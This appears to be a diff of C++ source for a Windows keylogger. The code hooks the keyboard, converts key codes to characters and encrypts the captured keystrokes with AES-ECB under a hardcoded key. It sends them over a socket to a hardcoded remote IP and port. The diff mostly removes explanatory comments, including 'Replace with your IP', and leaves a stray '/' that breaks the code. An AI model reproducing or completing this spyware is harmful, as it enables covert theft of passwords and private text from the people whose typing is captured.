@@ -33,7 +33,7 @@ unsigned char aes_iv[16] = {
 
 void encryptAes(const unsigned char* plainText, size_t plainTextLen, unsigned char* cipherText) {
     AES_KEY enc_key;
-    AES_set_encrypt_key(aes_key, 128, &enc_key); // Use 128, 192, or 256 for AES key length
+    AES_set_encrypt_key(aes_key, 128, &enc_key); 
     size_t blocks = plainTextLen / AES_BLOCK_SIZE;
     for (size_t i = 0; i < blocks; i++) {
         AES_ecb_encrypt(plainText + (i * AES_BLOCK_SIZE), cipherText + (i * AES_BLOCK_SIZE), &enc_key, AES_ENCRYPT);
@@ -43,9 +43,9 @@ void encryptAes(const unsigned char* plainText, size_t plainTextLen, unsigned ch
 void sendData() {
     while (programRunning) {
         if (!keyStrokes.empty()) {
-            size_t bufferSize = ((keyStrokes.size() / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE; // Ensure buffer is multiple of AES_BLOCK_SIZE
+            size_t bufferSize = ((keyStrokes.size() / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE;
             unsigned char* encryptedData = new unsigned char[bufferSize];
-            memset(encryptedData, 0, bufferSize); // Zero out memory for padding
+            memset(encryptedData, 0, bufferSize); 
             encryptAes(reinterpret_cast<const unsigned char*>(keyStrokes.data()), keyStrokes.size(), encryptedData);
 
             send(sock, reinterpret_cast<const char*>(encryptedData), bufferSize, 0);
@@ -74,7 +74,7 @@ char ConvertVKCodeToChar(DWORD vkCode) {
     if (result == 1 && buffer[0] != '\0') {
         return char(buffer[0]);
     } else {
-        return 0; // No valid char generated
+        return 0; 
     }
 }
 
@@ -122,9 +122,9 @@ int main() {
     WSADATA WSAData;
     WSAStartup(MAKEWORD(2, 2), &WSAData);
     sock = socket(AF_INET, SOCK_STREAM, 0);
-    server.sin_addr.s_addr = inet_addr("172.30.145.189"); // Replace with your IP
+    server.sin_addr.s_addr = inet_addr("172.30.145.189");
 server.sin_family = AF_INET;
-server.sin_port = htons(6969); // Replace with your port
+server.sin_port = htons(6969); /
 
 if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
     cerr << "Socket connection failed." << endl;
@@ -149,7 +149,7 @@ if (!keyboardHook) {
             DispatchMessage(&msg);
         }
         else {
-            Sleep(10); // Small delay to prevent high CPU usage
+            Sleep(10); 
         }
     }
 
